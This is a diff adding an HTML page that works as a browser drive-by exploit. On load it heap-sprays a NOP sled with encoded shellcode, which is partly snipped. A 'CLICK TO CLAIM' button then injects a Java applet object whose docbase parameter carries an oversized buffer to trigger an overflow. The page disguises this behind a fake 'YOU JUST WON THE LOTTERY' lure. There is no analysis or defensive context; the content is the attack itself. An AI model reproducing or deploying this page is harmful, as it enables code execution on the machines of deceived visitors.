@@ -1,0 +1,34 @@
+<html>
+ <head>
+ <script>
+   var arr = [];
+   function sprayer() {
+     var shcode = unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0...
+[snip]
+     ...uc175%ubbc3%ub5f0%u56a2%u006a%uff53%u41d5")
+     var nopsled = unescape("%u9090%u9090");
+     while(nopsled.length <= 0x100000 - shcode.length) {
+        nopsled += nopsled;
+     }
+     nopsled += shcode;
+     for(z = 0; z < 200; z++) {
+        arr[z] = z + nopsled;
+        arr[z].substring(0, 1);
+      }
+    }
+function exploit() {
+    var buffer = "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz"
+    var htmlTags =
+      "<object type='application/x-java-applet'>" +
+      "<param name='launchjnlp' value='1'>" +
+      "<param name='docbase' value='" + buffer + "'>" +
+      "</object>";
+  document.write(htmlTags);
+  }
+</script>
+</head>
+<body onload="sprayer()">
+    <strong>YOU JUST WON THE LOTTERY</strong>
+    <input type="button" value="CLICK TO CLAIM" onclick="exploit()">
+  </body>
+</html>
